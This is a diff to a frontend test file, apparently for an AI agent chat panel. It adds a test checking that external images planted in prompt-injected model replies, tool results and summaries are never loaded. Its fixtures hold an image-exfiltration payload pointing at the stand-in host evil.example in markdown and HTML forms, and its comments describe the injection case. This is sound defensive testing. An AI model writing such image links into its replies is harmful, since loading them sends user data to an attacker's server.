@@ -278,6 +278,68 @@ describe('AgentPanel in a conversation', () => {
   })
 })
 
+/**
+ * 注入要模型在回覆裡塞外部圖片（M5 票 15 第 5 類）：圖片網址是常見的外洩通道（brief §14）。後端把模型
+ * 寫的字原樣交成 `text` 片段（`tests/integration/test_agent_injection.py::TestImagesInTheReply`）；
+ * 這裡證明整個面板——重新載入的回覆、工具結果、壓縮摘要、剛串流進來的回覆——都不載入它。
+ * 單一元件怎麼畫在 `Markdown.test.tsx`（票 12）。
+ */
+describe('AgentPanel with a reply an injection wrote', () => {
+  const PIXEL = 'https://evil.example/pixel.png?k=leak'
+  const INJECTED = `好的。![ok](${PIXEL})\n\n<img src="${PIXEL}">\n\n![參照][p]\n\n[p]: ${PIXEL}`
+
+  it('does not load an image an injected reply points at, anywhere in the panel', async () => {
+    serve(
+      backend({
+        stored: [
+          {
+            id: 'u1',
+            role: 'user',
+            parts: [
+              { type: 'data-compaction', data: { content: `較早的摘要 ![s](${PIXEL})` } },
+              { type: 'text', text: '有什麼新的？' },
+            ],
+          },
+          {
+            id: 'a1',
+            role: 'assistant',
+            parts: [
+              {
+                type: 'tool-web_tavily_search',
+                toolCallId: 'call1',
+                state: 'output-available',
+                input: { query: 'SPY×FAMILY' },
+                output: [{ title: 'SPY×FAMILY', content: `![x](${PIXEL})` }],
+              },
+              // 前端不畫的片段型別：就算哪天後端交出來，也不該變成一張圖。
+              { type: 'file', mediaType: 'image/png', url: PIXEL },
+              { type: 'source-url', sourceId: 's1', url: PIXEL },
+              { type: 'text', text: INJECTED },
+            ],
+          },
+        ],
+        chat: () => stream(say(`串流的回覆 ![ok](${PIXEL})`)),
+      }),
+    )
+    const user = userEvent.setup()
+    renderPanel()
+
+    const log = await screen.findByRole('log')
+    await within(log).findByText('有什麼新的？')
+    await user.type(screen.getByRole('textbox', { name: '問助理' }), '再說一次{Enter}')
+    // 等串流的那一則畫出來：存著的那幾段早就在了，只數「沒有載入」會在它之前就過。
+    await within(log).findByText('串流的回覆')
+
+    expect(document.querySelector('img, picture, video, audio, iframe, object, embed')).toBeNull()
+    expect(document.querySelector('[src], [srcset], [poster]')).toBeNull()
+    expect(document.querySelector(`a[href*="evil.example"]`)).toBeNull()
+    // 網址照原文印出來，看得到它要往哪裡送。
+    expect(within(log).getAllByText(PIXEL).length).toBeGreaterThan(0)
+    const fetched = vi.mocked(fetch).mock.calls.map(([input]) => String(input))
+    expect(fetched.filter((url) => url.includes('evil.example'))).toEqual([])
+  })
+})
+
 describe('AgentPanel focus', () => {
   it('lands in the input once the conversation has loaded after the toggle opened it', async () => {
     sessionStorage.clear()
